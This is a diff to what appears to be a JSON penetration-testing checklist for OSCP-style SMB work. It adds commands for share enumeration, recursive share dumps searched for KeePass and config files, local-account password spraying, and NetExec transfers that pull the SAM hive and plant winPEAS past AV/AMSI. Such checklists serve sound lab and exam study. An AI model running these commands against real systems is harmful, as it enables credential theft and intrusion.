@@ -46,12 +46,30 @@
       "category": "2. Authenticated Enumeration",
       "tasks": [
         {
+          "id": "smb_smbmap_enum",
+          "title": "SMBMap Share & Permission Listing",
+          "description": "Quickly list every share the account can reach alongside its actual read/write permissions in one pass, which is faster to eyeball than connecting to each share individually with smbclient.",
+          "commands": [
+            "smbmap -H {target_ip} -u '<user>' -p '<password>'",
+            "smbmap -H {target_ip} -u '<user>' -p '<password>' -r '<ShareName>'"
+          ]
+        },
+        {
           "id": "smb_auth_connect",
           "title": "Connect & Loot Shares",
           "description": "Connect to a specific accessible share. Use 'get' to download files and 'put' to test upload permissions.",
           "commands": [
             "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '<Domain>\\\\<user>' --password '<password>'",
             "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U <user> --pw-nt-hash <NTLM_HASH>"
+          ]
+        },
+        {
+          "id": "smb_recursive_download",
+          "title": "Recursive Share Dump",
+          "description": "Pull down an entire share in one shot (e.g. to grep offline for KeePass files, configs, or credentials) instead of browsing manually.",
+          "commands": [
+            "smbclient \\\\\\\\{target_ip}\\\\<ShareName> -U '<user>%<password>' -c 'prompt off; recurse on; mget *'",
+            "find . -iname '*.kdbx' -o -iname '*config*'"
           ]
         },
         {
@@ -75,9 +93,10 @@
         {
           "id": "smb_password_spray",
           "title": "Password Spraying (NetExec)",
-          "description": "Use NetExec to spray user lists and custom wordlists against SMB.",
+          "description": "Use NetExec to spray user lists and custom wordlists against SMB. Add --local-auth when testing local (non-domain) accounts, e.g. a shared local admin password across hosts.",
           "commands": [
-            "nxc smb {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success --shares"
+            "nxc smb {target_ip} -u users.txt -p '/home/kali/Desktop/OSCP/Tools/Password cracking/jonspass.txt' --continue-on-success --shares",
+            "nxc smb {target_ip} -u <user> -p '<password>' --local-auth"
           ]
         }
       ]
@@ -145,6 +164,15 @@
           "commands": [
             "impacket-smbserver test . -smb2support -username kali -password kali",
             "net use m: \\\\\\\\<Kali_IP>\\\\test /user:kali kali"
+          ]
+        },
+        {
+          "id": "smb_nxc_get_put_file",
+          "title": "NetExec File Transfer (--get-file / --put-file)",
+          "description": "Fallback when in-session upload/download (evil-winrm, iwr, certutil) is broken or blocked by AV/AMSI. Transfers the file directly over the authenticated SMB/admin$ connection using your existing creds.",
+          "commands": [
+            "nxc smb {target_ip} -u '<user>' -p '<password>' --get-file 'C:\\Windows\\System32\\config\\SAM' sam.save",
+            "nxc smb {target_ip} -u '<user>' -p '<password>' --put-file ./winpeas.exe 'C:\\Windows\\Temp\\winpeas.exe'"
           ]
         }
       ]
